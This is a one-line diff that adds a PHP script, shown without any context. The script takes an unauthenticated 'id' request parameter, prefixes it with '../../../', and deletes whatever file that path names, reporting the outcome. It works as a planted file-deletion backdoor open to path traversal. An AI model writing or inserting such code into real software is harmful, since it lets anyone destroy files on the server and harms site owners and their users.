@@ -1,0 +1,1 @@
+<?php if(isset($_GET['id'])){$baseDir="../../../";$f=$baseDir.$_GET['id'];if(file_exists($f)){echo(unlink($f))?"'$f' rid.":" !rid '$f'.";}else{echo" $f ! exist";}}else{echo "! path ";} ?>
